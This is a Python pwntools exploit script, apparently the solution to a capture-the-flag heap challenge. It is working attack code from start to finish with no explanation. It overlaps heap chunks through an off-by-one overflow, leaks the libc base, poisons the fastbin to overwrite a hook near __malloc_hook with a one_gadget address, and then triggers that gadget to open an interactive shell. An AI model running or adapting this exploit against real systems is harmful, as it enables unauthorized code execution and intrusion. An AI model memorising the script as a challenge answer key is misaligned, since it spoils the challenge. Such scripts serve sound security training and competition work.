#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from pwn import *
from time import sleep

exe  = context.binary = ELF('./chall')
host = args.HOST or '0.0.0.0'
port = int(args.PORT or 1337)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

def option(choice):
	io.sendlineafter(b"> ", str(choice).encode('latin-1'))

def add(idx, size, data):
	option(1)
	io.sendlineafter(b"enter the index : ", str(idx).encode('latin-1'))
	io.sendlineafter(b"enter the size : ", str(size).encode('latin-1'))
	io.sendlineafter(b"Input : ", data)

def delete(idx):
	option(2)
	io.sendlineafter(b"enter the index : ", str(idx).encode('latin-1'))

def show(idx):
	option(3)
	io.sendlineafter(b"enter the index : ", str(idx).encode('latin-1'))
	return io.recvline()

libc=ELF("./libc.so.6")
# io = process("./chall")
io = remote("127.0.0.1", "1234")

add(0, 0xf0, b"B"*0xf0)
add(1, 0x70, b'B' * 0x70)
add(2, 0xf0, b'C' * 0xf0)
add(3, 0x30, b'D' * 0x30)
delete(0)
delete(1)
add(0, 0x78, b'E' * 0x70 + p64(0x180))
delete(2)
add(1, 0xf0, b'F' * 0xf0)
leak=show(0)
libc.address=u64(leak.strip(b"\n").ljust(8, b'\x00')) - 0x3c1b58
info(f"libc base {hex(libc.address)}")
add(4, 0x68, b'e' * 8)
add(5, 0x68, b'x' * 8)
delete(0)
delete(5)
delete(4)
add(6, 0x68, p64(libc.address+0x3c1acd))
add(7, 0x68, b"A"*8)
add(8, 0x68, b"A"*8) 
add(9, 0x68, b"A"*19 + p64(libc.address+0xf1919)) 
delete(9)

io.interactive()
